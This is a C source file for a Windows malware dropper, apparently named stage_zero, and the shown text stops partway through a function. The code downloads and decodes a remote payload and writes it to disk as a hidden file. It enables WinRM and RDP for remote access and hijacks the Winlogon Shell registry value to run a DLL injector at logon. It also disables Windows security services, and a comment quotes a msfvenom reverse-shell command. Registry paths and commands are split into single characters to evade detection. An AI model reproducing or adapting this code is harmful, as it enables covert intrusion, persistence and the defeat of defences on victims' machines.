#include <windows.h>

#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include "native.h"
#include <tlhelp32.h>
#include <Dbghelp.h>
#include <wchar.h> 
#include <wininet.h>

//Add dead code
//maybe try making the web server only requestable by CURL user agent (refer to nginx config)
//Enable WinRM for monitoring with evil-winrm

//mt.exe -manifest app.manifest -outputresource:.\stage_zero.exe


NTSTATUS STATUS;
unsigned char magic[160000];

/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/



#ifdef _WIN64
PPEB GetPEB() {
    return (PPEB)__readgsqword(0x60);
}
#elif _WIN32
PPEB GetPEB() {
    return (PPEB)__readfsdword(0x30);
}
#endif


char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
    int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
    char *empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

    if (empty_string == NULL) {
        //printf("Memory allocation failed\n");
        return NULL;
    }

    for (int i = 0; i < size; ++i) {
        char character = ALL_ALPHANUM[offsets[i]];
        empty_string[i] = character;  // Append the character to the string
		//printf("%c,",character);
	}

    empty_string[size] = '\0';  // Null-terminate the string

	return empty_string; 
}

void obfuscate(ALL_ALPHANUM,original)
	char * ALL_ALPHANUM;
	char * original;
{
	for (int i=0; i<strlen(original); i++){
		for (int j=0; j<strlen(ALL_ALPHANUM); j++){
			if (original[i] == ALL_ALPHANUM[j]){
				//printf("%d,",j);
			}
		}
	}
	return;
}





void decrypt(unsigned char *magic, SIZE_T magic_size, char key) {
    //printf("[+] DECRYPTING with '%c' key\n", key);
    for (int i = 0; i < magic_size; i++) {
        //printf("\\x%02x", magic[i] ^ key);
        magic[i] = magic[i] ^ key;
    }
    printf("\n");
	return;
}


HMODULE Get_Module(LPCWSTR Module_Name)
{
	HMODULE hModule;
	//printf("[+] Getting Handle to %ls\n", Module_Name);
	hModule = GetModuleHandleW(Module_Name);
	if (hModule == NULL) {
		//printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%ls\t0x%p]\n", Module_Name, hModule);
	return hModule;
}

HANDLE m_stuff(NtOpenMutant NT_OpenMutant, NtCreateMutant NT_CreateMutant,HANDLE hMux,ObjectAttributes *Object_Attr_mutant){
	STATUS = NT_OpenMutant(&hMux,MUTANT_ALL_ACCESS,Object_Attr_mutant);
	
	//STATUS_OBJECT_NAME_NOT_FOUND
	if(STATUS == 0xc0000034){
		//printf("[NT_OpenMutant] Mutant Object DOESN'T EXIST , status code 0x%lx\n",STATUS);
	}
	
	else if (STATUS == STATUS_SUCCESS){
		//printf("[NT_OpenMutant] Got Mutant Handle -> [0x%p]\n",hMux);
		//printf("[NT_OpenMutant] Mutant Object EXISTS\n");
		//printf("[x] EXITING\n");
		exit(0);
	}
	
	//printf("[NT_CreateMutant] Attempting to create mutant object\n");
	STATUS = NT_CreateMutant(&hMux,MUTANT_ALL_ACCESS,Object_Attr_mutant,TRUE);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NT_CreateMutant] Failed to create mutant object , error 0x%lx\n",STATUS);
		
		return NULL;
	}
	//printf("[NT_CreateMutant] Created Mutant, Handle -> [0x%p]\n",hMux);
	//system("pause");
	
	return hMux;
}


int w1n_Rm(){
	
	char full_string_1[30];	// winrm quickconfig -quiet
	char part_string_1_1[] = "w";
	char part_string_1_2[] = "i";
	char part_string_1_3[] = "n";
	char part_string_1_4[] = "r";
	char part_string_1_5[] = "m ";
	char part_string_1_6[] = "q";
	char part_string_1_7[] = "u";
	char part_string_1_8[] = "i";
	char part_string_1_9[] = "c";
	char part_string_1_10[] = "k";
	char part_string_1_11[] = "c";
	char part_string_1_12[] = "o";
	char part_string_1_13[] = "n";
	char part_string_1_14[] = "f";
	char part_string_1_15[] = "i";
	char part_string_1_16[] = "g";
	char part_string_1_17[] = " -";
	char part_string_1_18[] = "q";
	char part_string_1_19[] = "u";
	char part_string_1_20[] = "i";
	char part_string_1_21[] = "e";
	char part_string_1_22[] = "t";
	strcpy(full_string_1, part_string_1_1);
	strcat(full_string_1, part_string_1_2);
	strcat(full_string_1, part_string_1_3);
	strcat(full_string_1, part_string_1_4);
	strcat(full_string_1, part_string_1_5);
	strcat(full_string_1, part_string_1_6);
	strcat(full_string_1, part_string_1_7);
	strcat(full_string_1, part_string_1_8);
	strcat(full_string_1, part_string_1_9);
	strcat(full_string_1, part_string_1_10);
	strcat(full_string_1, part_string_1_11);
	strcat(full_string_1, part_string_1_12);
	strcat(full_string_1, part_string_1_13);
	strcat(full_string_1, part_string_1_14);
	strcat(full_string_1, part_string_1_15);
	strcat(full_string_1, part_string_1_16);
	strcat(full_string_1, part_string_1_17);
	strcat(full_string_1, part_string_1_18);
	strcat(full_string_1, part_string_1_19);
	strcat(full_string_1, part_string_1_20);
	strcat(full_string_1, part_string_1_21);
	strcat(full_string_1, part_string_1_22);
	
	int result = system(full_string_1);
	if (result == 0) {
        //printf("[+] WINRM ENABLED, cmd -> %s\n",full_string_1);
		return 0;
    } else {
        //printf("[x] Couldn't Enable WINRM, cmd -> %s\n",full_string_1);
		return 1;
    }
	
}

BOOL dw_ff1e1(const char *url, const char *output_path,FARPROC n3t_op3n_func,FARPROC n3t_op3n_ur1_func,FARPROC n3t_r3ad_f1l3_func,FARPROC n3t_cl0s3_hndl3_func) {
    HINTERNET hInternet = n3t_op3n_func("af21_ff1e1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;

    HINTERNET hUrl = n3t_op3n_ur1_func(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        n3t_cl0s3_hndl3_func(hInternet);
        return FALSE;
    }

    FILE *file = fopen(output_path, "wb");
    if (!file) {
        n3t_cl0s3_hndl3_func(hUrl);
        n3t_cl0s3_hndl3_func(hInternet);
        return FALSE;
    }

	char keys[]={'P','L','S','a','5','p','A','1','w','F'};
    BYTE buffer[4096];
    DWORD bytes_read;
    while (n3t_r3ad_f1l3_func(hUrl, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
		for (int i = 0; i < sizeof(keys); i++){
			decrypt(buffer,sizeof(buffer),keys[i]);
		}
		fwrite(buffer, 1, bytes_read, file);
    }

    fclose(file);
    n3t_cl0s3_hndl3_func(hUrl);
    n3t_cl0s3_hndl3_func(hInternet);
    return TRUE;
}








int ff_131mva(FARPROC open_key_reg_func,FARPROC set_key_reg_func,FARPROC close_key_reg_func){
	
	
	//SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
	char full_string_1[54];	
	char part_1_1[] = "SOF";
	char part_1_2[] = "TW";
	char part_1_3[] = "A";
	char part_1_4[] = "RE\\";
	char part_1_5[] = "Mi";
	char part_1_6[] = "cr";
	char part_1_7[] = "os";
	char part_1_8[] = "o";
	char part_1_9[] = "ft\\";
	char part_1_10[] = "Win";
	char part_1_11[] = "do";
	char part_1_12[] = "ws ";
	char part_1_13[] = "NT";
	char part_1_14[] = "\\Cu";
	char part_1_15[] = "rren";
	char part_1_16[] = "tVer";
	char part_1_17[] = "sio";
	char part_1_18[] = "n\\";
	char part_1_19[] = "Win";
	char part_1_20[] = "lo";
	char part_1_21[] = "go";
	char part_1_22[] = "n";
	strcpy(full_string_1, part_1_1);
	strcat(full_string_1, part_1_2);
	strcat(full_string_1, part_1_3);
	strcat(full_string_1, part_1_4);
	strcat(full_string_1, part_1_5);
	strcat(full_string_1, part_1_6);
	strcat(full_string_1, part_1_7);
	strcat(full_string_1, part_1_8);
	strcat(full_string_1, part_1_9);
	strcat(full_string_1, part_1_10);
	strcat(full_string_1, part_1_11);
	strcat(full_string_1, part_1_12);
	strcat(full_string_1, part_1_13);
	strcat(full_string_1, part_1_14);
	strcat(full_string_1, part_1_15);
	strcat(full_string_1, part_1_16);
	strcat(full_string_1, part_1_17);
	strcat(full_string_1, part_1_18);
	strcat(full_string_1, part_1_19);
	strcat(full_string_1, part_1_20);
	strcat(full_string_1, part_1_21);
	strcat(full_string_1, part_1_22);
	
	
	char full_string_2[154];	//	explorer.exe,"C:\Windows\Temp\SSS_ce1aaa99ce4bdb0101000000984b2414aa\dll_injector.exe" "C:\Windows\Temp\SSS_ce1aaa99ce4bdb0101000000984b2414aa\legit.dll"
	char part_2_1[] = "ex";	
	char part_2_2[] = "pl";
	char part_2_3[] = "or";
	char part_2_4[] = "er.";
	char part_2_5[] = "ex";
	char part_2_6[] = "e, ";
	char part_2_7[] = "\"C";
	char part_2_8[] = ":\\";
	char part_2_9[] = "Win";
	char part_2_10[] = "do";
	char part_2_11[] = "ws\\";
	char part_2_12[] = "Te";
	char part_2_13[] = "mp";
	char part_2_14[] = "\\S";
	char part_2_15[] = "S";
	char part_2_16[] = "S_ce";
	char part_2_17[] = "1aaa";
	char part_2_18[] = "99";
	char part_2_19[] = "ce4";
	char part_2_20[] = "bdb";
	char part_2_21[] = "01010";
	char part_2_22[] = "00000";
	char part_2_23[] = "984";
	char part_2_24[] = "b24";
	char part_2_25[] = "14aa";
	char part_2_26[] = "\\d";
	char part_2_27[] = "ll_";
	char part_2_28[] = "in";
	char part_2_29[] = "j";
	char part_2_30[] = "e";
	char part_2_31[] = "c";
	char part_2_32[] = "tor";
	char part_2_33[] = ".";
	char part_2_34[] = "e";
	char part_2_35[] = "xe";
	char part_2_36[] = "\" \"C";	
	char part_2_37[] = ":\\";
	char part_2_38[] = "Win";
	char part_2_39[] = "do";
	char part_2_40[] = "ws\\T";
	char part_2_41[] = "em";
	char part_2_42[] = "p\\S";
	char part_2_43[] = "SS_ce";
	char part_2_44[] = "1aaa";
	char part_2_45[] = "99c";
	char part_2_46[] = "e4bdb";
	char part_2_47[] = "0101";
	char part_2_48[] = "0000009";
	char part_2_49[] = "84b";
	char part_2_50[] = "2414aa";
	char part_2_51[] = "\\";
	char part_2_52[] = "le";
	char part_2_53[] = "g";
	char part_2_54[] = "it";
	char part_2_55[] = ".";
	char part_2_56[] = "d";
	char part_2_57[] = "l";
	char part_2_58[] = "l\"";
	
	strcpy(full_string_2, part_2_1);
	strcat(full_string_2, part_2_2);
	strcat(full_string_2, part_2_3);
	strcat(full_string_2, part_2_4);
	strcat(full_string_2, part_2_5);
	strcat(full_string_2, part_2_6);
	strcat(full_string_2, part_2_7);
	strcat(full_string_2, part_2_8);
	strcat(full_string_2, part_2_9);
	strcat(full_string_2, part_2_10);
	strcat(full_string_2, part_2_11);
	strcat(full_string_2, part_2_12);
	strcat(full_string_2, part_2_13);
	strcat(full_string_2, part_2_14);
	strcat(full_string_2, part_2_15);
	strcat(full_string_2, part_2_16);
	strcat(full_string_2, part_2_17);
	strcat(full_string_2, part_2_18);
	strcat(full_string_2, part_2_19);
	strcat(full_string_2, part_2_20);
	strcat(full_string_2, part_2_21);
	strcat(full_string_2, part_2_22);	
	strcat(full_string_2, part_2_23);
	strcat(full_string_2, part_2_24);
	strcat(full_string_2, part_2_25);
	strcat(full_string_2, part_2_26);
	strcat(full_string_2, part_2_27);
	strcat(full_string_2, part_2_28);
	strcat(full_string_2, part_2_29);
	strcat(full_string_2, part_2_30);
	strcat(full_string_2, part_2_31);
	strcat(full_string_2, part_2_32);
	strcat(full_string_2, part_2_33);
	strcat(full_string_2, part_2_34);
	strcat(full_string_2, part_2_35);
	strcat(full_string_2, part_2_36);
	strcat(full_string_2, part_2_37);
	strcat(full_string_2, part_2_38);
	strcat(full_string_2, part_2_39);
	strcat(full_string_2, part_2_40);
	strcat(full_string_2, part_2_41);
	strcat(full_string_2, part_2_42);
	strcat(full_string_2, part_2_43);
	strcat(full_string_2, part_2_44);
	strcat(full_string_2, part_2_45);
	strcat(full_string_2, part_2_46);
	strcat(full_string_2, part_2_47);
	strcat(full_string_2, part_2_48);
	strcat(full_string_2, part_2_49);
	strcat(full_string_2, part_2_50);
	strcat(full_string_2, part_2_51);
	strcat(full_string_2, part_2_52);
	strcat(full_string_2, part_2_53);
	strcat(full_string_2, part_2_54);
	strcat(full_string_2, part_2_55);
	strcat(full_string_2, part_2_56);
	strcat(full_string_2, part_2_57);
	strcat(full_string_2, part_2_58);
	
	
	
	char full_string_3[6];	
	char part_3_1[] = "S";	
	char part_3_2[] = "h";
	char part_3_3[] = "e";
	char part_3_4[] = "l";
	char part_3_5[] = "l";
	strcpy(full_string_3, part_3_1);
	strcat(full_string_3, part_3_2);
	strcat(full_string_3, part_3_3);
	strcat(full_string_3, part_3_4);
	strcat(full_string_3, part_3_5);

	HKEY hKey;
	LPCSTR subKey=full_string_1; //SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
	LPCSTR valueName=full_string_3; //Shell
	LPCSTR newValue=full_string_2;	//explorer.exe,\"C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\dll_injector.exe\" \"C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\legit.dll\"
	LSTATUS open_key = open_key_reg_func(HKEY_LOCAL_MACHINE,subKey,0,KEY_SET_VALUE,&hKey);
	if (open_key != ERROR_SUCCESS){
		//printf("Err opening the registery key -> code: %d\n",open_key);
		return 1;
	}
	
	
	LSTATUS set_key = set_key_reg_func(hKey,valueName,0,REG_SZ,(BYTE*)newValue,strlen(newValue)+1);
	if (set_key != ERROR_SUCCESS){
		//printf("Err setting the registery key -> code: %d\n",set_key);
		return 1;
	}
	return 0;
	//printf("[+] Registery key modified successfully\n[+] BINGO YOU HAVE ACHIEVED SYSTEM LEVEL PERSISTANCE\n");
}

int faow1231(FARPROC open_key_reg_func,FARPROC set_key_reg_func,FARPROC close_key_reg_func){
	
	char full_string_1[60];  
	char part_1_1[] = "S";
	char part_1_2[] = "Y";
	char part_1_3[] = "S";
	char part_1_4[] = "T";
	char part_1_5[] = "Y";
	char part_1_6[] = "M";
	char part_1_7[] = "\\";
	char part_1_8[] = "C";
	char part_1_9[] = "ur";
	char part_1_10[] = "re";
	char part_1_11[] = "nt";
	char part_1_12[] = "Co";
	char part_1_13[] = "nt";
	char part_1_14[] = "ro";
	char part_1_15[] = "lS";
	char part_1_16[] = "et\\";
	char part_1_17[] = "Se";
	char part_1_18[] = "rv";
	char part_1_19[] = "ic";
	char part_1_20[] = "es";
	char part_1_21[] = "\\";
	char part_1_22[] = "S";
	char part_1_23[] = "e";
	char part_1_24[] = "c";
	char part_1_25[] = "u";
	char part_1_26[] = "r";
	char part_1_27[] = "i";
	char part_1_28[] = "t";
	char part_1_29[] = "y";
	char part_1_30[] = "H";
	char part_1_31[] = "e";
	char part_1_32[] = "a";
	char part_1_33[] = "l";
	char part_1_34[] = "t";
	char part_1_35[] = "h";
	char part_1_36[] = "S";
	char part_1_37[] = "e";
	char part_1_38[] = "r";
	char part_1_39[] = "v";
	char part_1_40[] = "i";
	char part_1_41[] = "c";
	char part_1_42[] = "e";
	strcpy(full_string_1, part_1_1);
	strcat(full_string_1, part_1_2);
	strcat(full_string_1, part_1_3);
	strcat(full_string_1, part_1_4);
	strcat(full_string_1, part_1_5);
	strcat(full_string_1, part_1_6);
	strcat(full_string_1, part_1_7);
	strcat(full_string_1, part_1_8);
	strcat(full_string_1, part_1_9);
	strcat(full_string_1, part_1_10);
	strcat(full_string_1, part_1_11);
	strcat(full_string_1, part_1_12);
	strcat(full_string_1, part_1_13);
	strcat(full_string_1, part_1_14);
	strcat(full_string_1, part_1_15);
	strcat(full_string_1, part_1_16);
	strcat(full_string_1, part_1_17);
	strcat(full_string_1, part_1_18);
	strcat(full_string_1, part_1_19);
	strcat(full_string_1, part_1_20);
	strcat(full_string_1, part_1_21);
	strcat(full_string_1, part_1_22);
	strcat(full_string_1, part_1_23);
	strcat(full_string_1, part_1_24);
	strcat(full_string_1, part_1_25);
	strcat(full_string_1, part_1_26);
	strcat(full_string_1, part_1_27);
	strcat(full_string_1, part_1_28);
	strcat(full_string_1, part_1_29);
	strcat(full_string_1, part_1_30);
	strcat(full_string_1, part_1_31);
	strcat(full_string_1, part_1_32);
	strcat(full_string_1, part_1_33);
	strcat(full_string_1, part_1_34);
	strcat(full_string_1, part_1_35);
	strcat(full_string_1, part_1_36);
	strcat(full_string_1, part_1_37);
	strcat(full_string_1, part_1_38);
	strcat(full_string_1, part_1_39);
	strcat(full_string_1, part_1_40);
	strcat(full_string_1, part_1_41);
	strcat(full_string_1, part_1_42);
	
	
	char full_string_3[10];  
	char part_3_1[] = "S";
	char part_3_2[] = "t";
	char part_3_3[] = "a";
	char part_3_4[] = "r";
	char part_3_5[] = "t";
	strcpy(full_string_3, part_3_1);
	strcat(full_string_3, part_3_2);
	strcat(full_string_3, part_3_3);
	strcat(full_string_3, part_3_4);
	strcat(full_string_3, part_3_5);
	
	
	HKEY hKey_1;
	LPCSTR subKey_1=full_string_1;	//"SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService"
	LPCSTR valueName_1=full_string_3;	//Start
	DWORD newValue_1=4;
	//printf("[+] OPENING KEY..\n");
	LSTATUS open_key_1 = open_key_reg_func(HKEY_LOCAL_MACHINE,subKey_1,0,KEY_SET_VALUE,&hKey_1);
	if (open_key_1 != ERROR_SUCCESS){
		//printf("Err opening the registery key -> code: %d\n",open_key_1);
		return 1;
	}
	//printf("[+] OPENED KEY..\n");
	//printf("[+] SETTING VALUE..\n");
	LSTATUS set_key_1 = set_key_reg_func(hKey_1,valueName_1,0,REG_SZ,(BYTE*)&newValue_1,sizeof(newValue_1));
	if (set_key_1 != ERROR_SUCCESS){
		//printf("Err setting the registery key -> code: %d\n",set_key_1);
		return 1;
	}
	//printf("[+] VALUE SET CORRECTLY..\n");
	
	
	char full_string_2[50];  
	char part_2_1[] = "S";
	char part_2_2[] = "Y";
	char part_2_3[] = "S";
	char part_2_4[] = "T";
	char part_2_5[] = "Y";
	char part_2_6[] = "M";
	char part_2_7[] = "\\";
	char part_2_8[] = "C";
	char part_2_9[] = "ur";
	char part_2_10[] = "re";
	char part_2_11[] = "nt";
	char part_2_12[] = "Co";
	char part_2_13[] = "nt";
	char part_2_14[] = "ro";
	char part_2_15[] = "lS";
	char part_2_16[] = "et\\";
	char part_2_17[] = "Se";
	char part_2_18[] = "rv";
	char part_2_19[] = "ic";
	char part_2_20[] = "es";
	char part_2_21[] = "\\";
	char part_2_22[] = "w"; 
	char part_2_23[] = "s";
	char part_2_24[] = "c";
	char part_2_25[] = "s";
	char part_2_26[] = "v";
	char part_2_27[] = "c";
	strcpy(full_string_2, part_2_1);
	strcat(full_string_2, part_2_2);
	strcat(full_string_2, part_2_3);
	strcat(full_string_2, part_2_4);
	strcat(full_string_2, part_2_5);
	strcat(full_string_2, part_2_6);
	strcat(full_string_2, part_2_7);
	strcat(full_string_2, part_2_8);
	strcat(full_string_2, part_2_9);
	strcat(full_string_2, part_2_10);
	strcat(full_string_2, part_2_11);
	strcat(full_string_2, part_2_12);
	strcat(full_string_2, part_2_13);
	strcat(full_string_2, part_2_14);
	strcat(full_string_2, part_2_15);
	strcat(full_string_2, part_2_16);
	strcat(full_string_2, part_2_17);
	strcat(full_string_2, part_2_18);
	strcat(full_string_2, part_2_19);
	strcat(full_string_2, part_2_20);
	strcat(full_string_2, part_2_21);
	strcat(full_string_2, part_2_22);
	strcat(full_string_2, part_2_23);
	strcat(full_string_2, part_2_24);
	strcat(full_string_2, part_2_25);
	strcat(full_string_2, part_2_26);
	strcat(full_string_2, part_2_27);
	
	HKEY hKey_2;
	LPCSTR subKey_2=full_string_2;	//"SYSTEM\\CurrentControlSet\\Services\\wscsvc"
	LPCSTR valueName_2=full_string_3;
	DWORD newValue_2=4;
	LSTATUS open_key_2 = open_key_reg_func(HKEY_LOCAL_MACHINE,subKey_2,0,KEY_SET_VALUE,&hKey_2);
	if (open_key_1 != ERROR_SUCCESS){
		//printf("Err opening the registery key -> code: %d\n",open_key_2);
		return 1;
	}
	LSTATUS set_key_2 = set_key_reg_func(hKey_2,valueName_2,0,REG_SZ,(BYTE*)&newValue_2,sizeof(newValue_2));
	if (set_key_2 != ERROR_SUCCESS){
		//printf("Err setting the registery key -> code: %d\n",set_key_2);
		return 1;
	}
	//printf("[+] Registery key modified successfully\n[+] BINGO YOU HAVE DISABLED WINDOWS DEFENDER\n");
	return 0;
	
}

BOOL f013(LPCSTR full_path, FARPROC cr_file_func, FARPROC wr_file_func){
	HANDLE hFile = cr_file_func(
        full_path,           // File name
        GENERIC_WRITE,      // Desired access
        0,                  // Share mode (0 means no sharing)
        NULL,               // Security attributes
        CREATE_ALWAYS,      // Creation disposition (creates new or overwrites existing)
        FILE_ATTRIBUTE_HIDDEN, // File attributes
        NULL                // Template file
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        //printf("Failed to create or open file. Error code: %lu\n", GetLastError());
        exit(1);
    }
    DWORD bytesWritten;
    BOOL writeResult = wr_file_func(
        hFile,              // File handle
        magic,        		 // Data to write
        sizeof(magic), // Number of bytes to write
        &bytesWritten,      // Number of bytes written
        NULL                // Overlapped structure (NULL for synchronous)
    );

    if (!writeResult) {
        //printf("Failed to write to file. Error code: %lu\n", GetLastError());
        exit(1);
        
    }
    // Print the number of bytes written
    //printf("Successfully wrote %lu bytes to the file.\n", bytesWritten);
	return TRUE;
	
}



BOOL all1_901A(FARPROC open_SC_func,FARPROC open_service_func,FARPROC start_service_func,FARPROC close_service_func){
	
    SC_HANDLE schSCManager = open_SC_func(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL) {
        //printf("OpenSCManager failed (%d)\n", GetLastError());
        exit(1);
		return 1;
    }



    SC_HANDLE schService = open_service_func(
        schSCManager,              // SCM database
        "win_service32",               // Name of service
        SC_MANAGER_ALL_ACCESS              // Desired Access
    );
	
    if (schService == NULL) {
        //printf("OpenService failed (%d)\n", GetLastError());
        close_service_func(schSCManager);
        exit(1);
    }
	
	BOOL bService = start_service_func(schService,0,NULL);
    if (bService == 0) {
        //printf("StartService failed (%d)\n", GetLastError());
        close_service_func(schSCManager);
        exit(1);
    }

    //printf("Service started successfully\n");	
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
	
	return TRUE;
}


void en_R_6_P(	FARPROC open_key_reg_func,
				FARPROC set_key_reg_func,
				FARPROC close_key_reg_func,
				FARPROC open_SC_func,
				FARPROC open_service_func,
				FARPROC start_service_func,
				FARPROC close_service_func
) 
{
    HKEY hKey;
    DWORD dwValue = 0;
	//printf("[+] opening first reg key\n");
    // Open the registry key
	// SYSTEM\\CurrentControlSet\\Control\\Terminal Server
	char full_string_4[50];  
	char part_4_1[] = "S";
	char part_4_2[] = "Y";
	char part_4_3[] = "S";
	char part_4_4[] = "T";
	char part_4_5[] = "E";
	char part_4_6[] = "M";
	char part_4_7[] = "\\";
	char part_4_8[] = "C";
	char part_4_9[] = "u";
	char part_4_10[] = "r";
	char part_4_11[] = "r";
	char part_4_12[] = "e";
	char part_4_13[] = "n";
	char part_4_14[] = "t";
	char part_4_15[] = "C";
	char part_4_16[] = "o";
	char part_4_17[] = "nt";
	char part_4_18[] = "r";
	char part_4_19[] = "o";
	char part_4_20[] = "l";
	char part_4_21[] = "S";
	char part_4_22[] = "e";
	char part_4_23[] = "t";
	char part_4_24[] = "\\";
	char part_4_25[] = "C";
	char part_4_26[] = "o";
	char part_4_27[] = "n";
	char part_4_28[] = "t";
	char part_4_29[] = "r";
	char part_4_30[] = "o";
	char part_4_31[] = "l";
	char part_4_32[] = "\\";
	char part_4_33[] = "T";
	char part_4_34[] = "e";
	char part_4_35[] = "r";
	char part_4_36[] = "m";
	char part_4_37[] = "i";
	char part_4_38[] = "n";
	char part_4_39[] = "a";
	char part_4_40[] = "l";
	char part_4_41[] = " ";
	char part_4_42[] = "S";
	char part_4_43[] = "e";
	char part_4_44[] = "r";
	char part_4_45[] = "v";
	char part_4_46[] = "e";
	char part_4_47[] = "r";
	strcpy(full_string_4, part_4_1);
	strcat(full_string_4, part_4_2);
	strcat(full_string_4, part_4_3);
	strcat(full_string_4, part_4_4);
	strcat(full_string_4, part_4_5);
	strcat(full_string_4, part_4_6);
	strcat(full_string_4, part_4_7);
	strcat(full_string_4, part_4_8);
	strcat(full_string_4, part_4_9);
	strcat(full_string_4, part_4_10);
	strcat(full_string_4, part_4_11);
	strcat(full_string_4, part_4_12);
	strcat(full_string_4, part_4_13);
	strcat(full_string_4, part_4_14);
	strcat(full_string_4, part_4_15);
	strcat(full_string_4, part_4_16);
	strcat(full_string_4, part_4_17);
	strcat(full_string_4, part_4_18);
	strcat(full_string_4, part_4_19);
	strcat(full_string_4, part_4_20);
	strcat(full_string_4, part_4_21);
	strcat(full_string_4, part_4_22);
	strcat(full_string_4, part_4_23);
	strcat(full_string_4, part_4_24);
	strcat(full_string_4, part_4_25);
	strcat(full_string_4, part_4_26);
	strcat(full_string_4, part_4_27);
	strcat(full_string_4, part_4_28);
	strcat(full_string_4, part_4_29);
	strcat(full_string_4, part_4_30);
	strcat(full_string_4, part_4_31);
	strcat(full_string_4, part_4_32);
	strcat(full_string_4, part_4_33);
	strcat(full_string_4, part_4_34);
	strcat(full_string_4, part_4_35);
	strcat(full_string_4, part_4_36);
	strcat(full_string_4, part_4_37);
	strcat(full_string_4, part_4_38);
	strcat(full_string_4, part_4_39);
	strcat(full_string_4, part_4_40);
	strcat(full_string_4, part_4_41);
	strcat(full_string_4, part_4_42);
	strcat(full_string_4, part_4_43);
	strcat(full_string_4, part_4_44);
	strcat(full_string_4, part_4_45);
	strcat(full_string_4, part_4_46);
	strcat(full_string_4, part_4_47);
	
    if (open_key_reg_func(HKEY_LOCAL_MACHINE, full_string_4, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        //printf("Failed to open registry key.\n");
        return;
    }
	//printf("[+] opening first reg key\n");
	// fDenyTSConnections
	char full_string_5[20];  
	char part_5_1[] = "f";
	char part_5_2[] = "D";
	char part_5_3[] = "e";
	char part_5_4[] = "n";
	char part_5_5[] = "y";
	char part_5_6[] = "T";
	char part_5_7[] = "S";
	char part_5_8[] = "C";
	char part_5_9[] = "o";
	char part_5_10[] = "n";
	char part_5_11[] = "n";
	char part_5_12[] = "e";
	char part_5_13[] = "c";
	char part_5_14[] = "t";
	char part_5_15[] = "i";
	char part_5_16[] = "o";
	char part_5_17[] = "n";
	char part_5_18[] = "s";
	strcpy(full_string_5, part_5_1);
	strcat(full_string_5, part_5_2);
	strcat(full_string_5, part_5_3);
	strcat(full_string_5, part_5_4);
	strcat(full_string_5, part_5_5);
	strcat(full_string_5, part_5_6);
	strcat(full_string_5, part_5_7);
	strcat(full_string_5, part_5_8);
	strcat(full_string_5, part_5_9);
	strcat(full_string_5, part_5_10);
	strcat(full_string_5, part_5_11);
	strcat(full_string_5, part_5_12);
	strcat(full_string_5, part_5_13);
	strcat(full_string_5, part_5_14);
	strcat(full_string_5, part_5_15);
	strcat(full_string_5, part_5_16);
	strcat(full_string_5, part_5_17);
	strcat(full_string_5, part_5_18);
    // Set set_key_reg_func to 0 to enable RDP
    if (set_key_reg_func(hKey, full_string_5, 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue)) != ERROR_SUCCESS) {
        //printf("Failed to set fDenyTSConnections.\n");
        close_key_reg_func(hKey);
        return;
    }
	
	char full_string_6[20];  
	char part_6_1[] = "U";
	char part_6_2[] = "s";
	char part_6_3[] = "e";
	char part_6_4[] = "r";
	char part_6_5[] = "A";
	char part_6_6[] = "u";
	char part_6_7[] = "t";
	char part_6_8[] = "h";
	char part_6_9[] = "h";
	char part_6_10[] = "e";
	char part_6_11[] = "t";
	char part_6_12[] = "i";
	char part_6_13[] = "c";
	char part_6_14[] = "a";
	char part_6_15[] = "t";
	char part_6_16[] = "i";
	char part_6_17[] = "o";
	char part_6_18[] = "n";
	strcpy(full_string_6, part_6_1);
	strcat(full_string_6, part_6_2);
	strcat(full_string_6, part_6_3);
	strcat(full_string_6, part_6_4);
	strcat(full_string_6, part_6_5);
	strcat(full_string_6, part_6_6);
	strcat(full_string_6, part_6_7);
	strcat(full_string_6, part_6_8);
	strcat(full_string_6, part_6_9);
	strcat(full_string_6, part_6_10);
	strcat(full_string_6, part_6_11);
	strcat(full_string_6, part_6_12);
	strcat(full_string_6, part_6_13);
	strcat(full_string_6, part_6_14);
	strcat(full_string_6, part_6_15);
	strcat(full_string_6, part_6_16);
	strcat(full_string_6, part_6_17);
	strcat(full_string_6, part_6_18);
	
	
	char full_string_7[25];  
	char part_7_1[] = "f";
	char part_7_2[] = "S";
	char part_7_3[] = "i";
	char part_7_4[] = "n";
	char part_7_5[] = "g";
	char part_7_6[] = "l";
	char part_7_7[] = "e";
	char part_7_8[] = "S";
	char part_7_9[] = "e";
	char part_7_10[] = "s";
	char part_7_11[] = "s";
	char part_7_12[] = "i";
	char part_7_13[] = "o";
	char part_7_14[] = "n";
	char part_7_15[] = "P";
	char part_7_16[] = "e";
	char part_7_17[] = "r";
	char part_7_18[] = "U";
	char part_7_19[] = "s";
	char part_7_20[] = "e";
	char part_7_21[] = "r";
	strcpy(full_string_7, part_7_1);
	strcat(full_string_7, part_7_2);
	strcat(full_string_7, part_7_3);
	strcat(full_string_7, part_7_4);
	strcat(full_string_7, part_7_5);
	strcat(full_string_7, part_7_6);
	strcat(full_string_7, part_7_7);
	strcat(full_string_7, part_7_8);
	strcat(full_string_7, part_7_9);
	strcat(full_string_7, part_7_10);
	strcat(full_string_7, part_7_11);
	strcat(full_string_7, part_7_12);
	strcat(full_string_7, part_7_13);
	strcat(full_string_7, part_7_14);
	strcat(full_string_7, part_7_15);
	strcat(full_string_7, part_7_16);
	strcat(full_string_7, part_7_17);
